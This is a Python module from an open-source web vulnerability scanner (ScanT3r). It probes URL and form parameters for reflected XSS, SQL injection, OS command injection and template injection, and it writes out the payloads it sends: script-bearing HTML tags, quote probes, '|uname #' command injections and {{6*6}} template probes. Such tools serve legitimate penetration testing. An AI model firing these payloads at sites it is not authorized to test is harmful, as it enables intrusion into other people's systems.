#!/usr/bin/env python3
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
__author__ = 'Khaled Nassar'
__version__ = '0.3#beta'
__github__ = 'https://github.com/knassar702/scant3r'
__email__ = 'knassar702@gmail.com'
__blog__ = 'https://knassar7o2.blogspot.com'

import requests,sys,os,re,random,urllib3
from .encoder import urlencoder
from .colors import *
from .reporter import make_report
from time import sleep
from .logger import logger
all_bugs = []
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
errors = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'unkown' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'Fatal error': 'Fatal error',
             'FetchRow()' : 'FetchRow()',
	     'Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found','internal server':'The page cannot be displayed because an internal server error has occurred.','Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
def uagent(payload=None,one=False,cagent=None):
	agents=[
	'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
	'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
	'Opera/8.01 (Windows NT 5.1; U; pl)',
	'Opera/8.50 (Windows NT 5.0; U; en)',
	'Opera/9.00 (Macintosh; PPC Mac OS X; U; es)',
	'Opera/9.24 (X11; Linux i686; U; de)',
	'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53'
	]
	if payload:
		if cagent:
			ag = cagent.encode('utf-8') + payload.encode('utf-8')
			return ag
		if one:
			return 'Opera/9.24 (X11; Linux i686; U; de)'.encode('utf-8') + payload.encode('utf-8')
		ag = random.choice(agents) + payload
		return ag # Add random User-agent in request
	if cagent:
		return (cagent.encode('utf-8'))
	if one:
		return 'Opera/9.24 (X11; Linux i686; U; de)'
	return random.choice(agents).encode('utf-8') # Add random User-agent in request	
class paramscanner: # Scanner Module
	def __init__(slef):
		pass
	def xss(slef,url,co,tim,deco,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		logger.info('Scanning from XSS Reflected With GET Method')
		deco = deco - 1
		if '*' in url:
			logger.info('relpacing (*) from url to payload')
			logger.info('Trying to get a reflect from the parameter')
			x = 0
			c = requests.get(url,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			ch = re.findall('ScanT3r'.encode('utf-8'),c.content)
			logger.info('Send http request with "ScanT3r" word for get a reflect')
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			check = requests.get(url.replace('*','ScanT3r'),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			che = re.findall('ScanT3r'.encode('utf-8'),check.content)
			if len(ch) < len(che):
				logger.info('reflect is found')
				payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
				logger.info('Trying to get xss from the parameter')
				for payload in payloads:
					payload2=urlencoder(payload)
					for i in range(deco):
						payload2=urlencoder(payload2)
					if slp != 0:
						logger.debug(f'Sleeping {slp} sec')
					sleep(slp)
					r=requests.get(url.replace('*',payload2),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
					if payload.encode('utf-8') in r.content:
						j=url.replace('*',payload2)
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Exploit : {j}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
						if batch:
							print('\n Continue ? [Y,n] Y')
						else:
							cont = input('\n Continue ? [Y,n]').lower()
							if cont != '':
								exit()
							elif cont != 'y':
								exit()
						x = 1
						break
				if x == 0:
					logger.info("Not vulnerable from XSS With GET Method")
			else:
				pass
		elif '*' not in url:
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
			for params in url.split("?")[1].split("&"):
				if slp != 0:
					logger.debug(f'Sleeping {slp} sec')
				sleep(slp)	
				r2 = requests.get(url.replace(params, params + str('ScanT3r')),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				if slp != 0:
					logger.debug(f'Sleeping {slp} sec')
				sleep(slp)
				r1 = requests.get(url,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				r2 = re.findall('ScanT3r'.encode('utf-8'),r2.content)
				r1 = re.findall('ScanT3r'.encode('utf-8'),r1.content)
				if len(r2) > len(r1):
					logger.info('reflect is Found')
					for payload in payloads:
						payload2=urlencoder(payload)
						for i in range(deco):
							payload2=urlencoder(payload2) # encode the payload
						sleep(slp)
						logger.info('try to get xss from the reflect')
						r=requests.get(url.replace(params, params + str(payload2).strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
						if payload.encode('utf-8') in r.content:
							j=url.replace(params, params + str(payload2).strip())
							print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Param : {params}
{info}{bold} Exploit : {j}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
							x = 1
							if batch:
								print('\n Continue ? [Y,n] Y')
							else:
								cont = input('\n Continue ? [Y,n]').lower()
								if cont != '':
									exit()
								elif cont != 'y':
									exit()
							break
					if x == 0:
						logger.info("Not vulnerable from XSS With GET Method")
				else:
					break
	def xss_post(self,url,co,tim,dat,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		ok = False
		logger.info('Scanning from XSS With POST Method')
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			logger.info('replacing (*) from url to payload')
			x = 0
			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>"]
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			logger.info('Send post request for get a HTML of page')
			r1 = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			if slp == 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			logger.info('relpacing (*) from url to payload')
			for i,c in dat.items():
				dat[i] = c.replace('*','ScanT3r')
			logger.info('Send post request with payload for get a reflect')
			r2 = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			for i,c in dat.items():
				dat[i] = c.replace('ScanT3r','*')
			r1 = re.findall('ScanT3r'.encode('utf-8'),r1.content)
			r2 = re.findall('ScanT3r'.encode('utf-8'),r2.content)
			if len(r2) > len(r1):
				logger.info('reflect is Found')
				logger.info('Trying to get xss from the parameter')
				for payload in payloads:
						for i,c in dat.items():
							dat[i] = c.replace('*',payload)
						sleep(slp)
						r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
						if payload.encode('utf-8') in r.content:
							print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
							for i,c in dat.items():
								dat[i] = c.replace(payload,'*')
							x = 1
							if batch:
								print('\n Continue ? [Y,n] Y')
							else:
								cont = input('\n Continue ? [Y,n]').lower()
								if cont != '':
									exit()
								elif cont != 'y':
									exit()
							break
						else:
							for i,c in dat.items():
								dat[i] = c.replace(payload,'*')
							continue
				if x == 0:
					logger.info("Not vulnerable from XSS With GET Method")
			else:
				pass
		else:
			payloads=["'><img src=x onerror=alert(1)>",'">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			r1 = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			for i,c in dat.items():
				dat[i] = c + 'ScanT3r'
			logger.info('Send request with "ScanT3r" word for get a reflect')
			r2 = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			for i,c in dat.items():
				dat[i] = c.replace('ScanT3r','')
			r1 = re.findall('ScanT3r'.encode('utf-8'),r1.content)
			r2 = re.findall('ScanT3r'.encode('utf-8'),r2.content)
			if len(r2) > len(r1):
				logger.info('reflect is found')
				for payload in payloads:
					for i,c in dat.items():
						dat[i] = c + payload
					sleep(slp)
					r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
					if payload.encode('utf-8') in r.content:
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS Reflected
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
						for i,c in dat.items():
							dat[i] = c.replace(payload,'')
						if batch:
							print('\n Continue ? [Y,n] Y')
						else:
							cont = input('\n Continue ? [Y,n]').lower()
							if cont != '':
								exit()
							elif cont != 'y':
								exit()
						x = 1
						break
					else:
						for i,c in dat.items():
							dat[i] = c.replace(payload,'')
						continue
				if x == 0:
					logger.info("Not vulnerable from XSS With GET Method")
	def sqli_post(self,url,co,tim,dat,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		ok = False
		if slp != 0:
			logger.debug(f"Sleeping {slp} sec")
		sleep(slp)
		logger.info('Scanning SQLI using post method With POST Method')
#		te = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
#		for c,d in errors.items():
#			fir = re.findall(d.encode('utf-8'),te.content)
#			if fir != []:
#				break
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payload='"'
			logger.info("replacing (*) from url to payload")
			for i,d in dat.items():
				dat[i] = d.replace('*',payload)
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			x = 0
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}{bold}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'*')
			if x == 0:
				logger.info("Not vulnerable from SQLI With POST Method")
		else:
			payload='"'
			for i,d in dat.items():
				dat[i] = d + payload
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			x = 0
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL injection
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					break
			for i,d in dat.items():
				dat[i] = d.replace(payload,'')
			if x == 0:
				logger.info("Not vulnerable from SQLI")
	def osinj_post(self,url,co,tim,dat,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		if slp != 0:
			logger.debug(f'Sleeping {slp} sec')
		sleep(slp)
		te = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent,one=True)},proxies=proxy)
		fir = re.findall('Linux'.encode('utf-8'),te.content)
		ok = False
		logger.info('Scanning From RCE With POST Method')
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			payloads=["|uname #",'"|uname #',"'|uname #"]
			logger.info('replacing (*) from url to payload')
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*',payload)
				if slp != 0:
					logger.debug(f'Sleeping {slp} sec')
				sleep(slp)
				logger.info('sent post request with RCE payload')
				r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent,one=True)},proxies=proxy)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				x = 0
				if len(ch) > len(fir):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'*')
					continue
				if x == 0:
				 logger.info("Not vulnerable from RCE With POST Method")
		else:
			payloads=['"|uname #','|uname #',"'|uname #"]
			for payload in payloads:
				for i,d in dat.items():
					dat[i] = d + payload
				sleep(slp)
				r = requests.post(url,data=dat,cookies=co,verify=vert,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent,one=True)},proxies=proxy)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = d.replace(payload,'')
					continue
				if x == 0:
					logger.info('Not vulnerable from RCE With POST Method')
	def ssti_post(self,url,co,tim,dat,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		ok = False
		logger.info('Scanning from SSTI With POST Method')
		for i,d in dat.items():
			if '*' in d:
				ok = True
		if ok:
			logger.info('replacing (*) From url to payload')
			x = 0
			payloads=['{{6*6}}','<%= 6 * 6 %>','${6*6}']
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c.replace('*','Scant3rSSTI')
				te = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				sleep(slp)
				fir = re.findall('36'.encode('utf-8'),te.content)
				for i,c in dat.items():
					dat[i] = c.replace('Scant3rSSTI',payload)
				sleep(slp)
				r = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				ch = re.findall('36'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					r = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
					ch = re.findall('36'.encode('utf-8'),r.content)
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'*')
					continue
				if x == 0:
					logger.info('Not vulnerable from SSTI With POST Method')
		else:
			payloads=['{{6*6}}','<%= 6 * 6 %>','${6*6}']
			x = 0
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			te = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			fir = re.findall('36'.encode('utf-8'),te.content)
			for payload in payloads:
				for i,c in dat.items():
					dat[i] = c + payload
				sleep(slp)
				r = requests.post(url,data=dat,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				ch = re.findall('36'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template injection (SSTI)
{info}{bold} Payload : {payload}
{info}{bold} Method  : [{yellow}POST{end}]
{info}{bold} VALUS   : {dat}
{info}{bold} URL     : {url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					break
				else:
					for i,d in dat.items():
						dat[i] = i.replace(payload,'')
					continue
			if x == 0:
				logger.info('Not vulnerable from SSTI With POST Method')
	def sqli(self,url,co,tim,deco,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		deco = deco - 1
		logger.info("Scanning from SQLI With GET Method")
		payload='"'
		if slp != 0:
			logger.debug(f'Sleeping {slp} sec')
		sleep(slp)
		if '*' in url:
			logger.info("replacing (*) from url to payload")
			payload='"'
			payload=urlencoder(payload)
			for i in range(deco):
				payload=urlencoder(payload)
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			x = 0
			r=requests.get(url.replace('*',payload.strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			for f,i in errors.items():
				ch=re.findall(i.encode('utf-8'),r.content)
				if len(ch) > 0:
					j=url.replace('*',payload.strip())
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload : "
{info}{bold} Exploit : {j}
{info}{bold} SQL Error : {i}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					break
			if x == 0:
				logger.info('Not vulnerable from SQLI With GET Method')
		elif '*' not in url:
			x = 0
			for params in url.split("?")[1].split("&"):
				payload='"'
				payload=urlencoder(payload)
				for h in range(deco):
					payload=urlencoder(payload)
				if slp != 0:
					logger.debug(f'Sleeping {slp} sec')
				sleep(slp)
				r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				for d,i in errors.items():
					ch = re.findall(i.encode('utf-8'),r.content)
					if len(ch) > 0:
						j=url.replace(params, params + str(payload).strip())
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection
{bold}{info}{bold} Payload   : {payload}
{bold}{info}{bold} Param     : {params}
{bold}{info}{bold} SQL Error : {i}
{bold}{info}{bold} Exploit   : {j}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
						if batch:
							print('\n Continue ? [Y,n] Y')
						else:
							cont = input('\n Continue ? [Y,n]').lower()
							if cont != '':
								exit()
							elif cont != 'y':
								exit()
						x = 1
						break
				if x == 0:
					logger.info('Not vulnerable from SQLI With GET Method')
	def osinj(self,url,co,tim,deco,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		logger.info('Scanning from RCE With GET Method')
		deco = deco - 1
		if slp != 0:
			logger.debug(f"Sleeping {slp} sec")
		sleep(slp)
		te = requests.get(url,cookies=co,headers={'User-agent':uagent(cagent=cagent,one=True)},verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
		fir = re.findall('Linux'.encode('utf-8'),te.content)
		if '*' in url:
			logger.info('replacing (*) from url to payload')
			x = 0
			payloads=["'|uname %23",'"|uname %23',"|uname %23"]
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				sleep(slp)
				r=requests.get(url.replace('*',str(payload).strip()),headers={'User-agent':uagent(cagent=cagent,one=True)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					j=url.replace('*',payload.strip())
					print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					break
			if x == 0:
				logger.info('Not vulnerable from RCE With GET Method')
		else:
			x = 0
			for params in url.split("?")[1].split("&"):
				payloads=["|uname %23","'|uname %23",'"|uname %23']
				for payload in payloads:
					for h in range(deco):
						payload=urlencoder(payload)
					sleep(slp)
					r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent(cagent=cagent,one=True)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
					ch = re.findall('Linux'.encode('utf-8'),r.content)
					if len(ch) > len(fir):
						j=url.replace(params, params + str(payload).strip())
						print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (RCE)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
						if batch:
							print('\n Continue ? [Y,n] Y')
						else:
							cont = input('\n Continue ? [Y,n]').lower()
							if cont != '':
								exit()
							elif cont != 'y':
								exit()
						x = 1
						break
				if x == 0:
					logger.info('Not vulnerable from RCE With GET Method')	
	def ssti(self,url,co,tim,deco,vert,redir,cagent=None,proxy=None,slp=0,batch=None):
		logger.info('Scanning from SSTI With GET Method')
		if '*' in url:
			logger.info('replacing (*) from url to payload')
			x = 0
			payloads=['{{ 6*6 }}','<%= 6 * 6 %>','${6*6}']
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			te=requests.get(url.replace('*',''),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			fir = re.findall('36'.encode('utf-8'),te.content)
			for payload in payloads:
				for h in range(deco):
					payload=urlencoder(payload)
				sleep(slp)
				r=requests.get(url.replace('*',str(payload).strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
				ch = re.findall('36'.encode('utf-8'),r.content)
				if len(ch) > len(fir):
					j=url.replace('*',str(payload).strip())
					print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Exploit : {j}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					if batch:
						print('\n Continue ? [Y,n] Y')
					else:
						cont = input('\n Continue ? [Y,n]').lower()
						if cont != '':
							exit()
						elif cont != 'y':
							exit()
					x = 1
					break
				if x == 0:
					logger.info('Not vulnerable from SSTI With GET Method')
		elif '*' not in url:
			if slp != 0:
				logger.debug(f'Sleeping {slp} sec')
			sleep(slp)
			x = 0
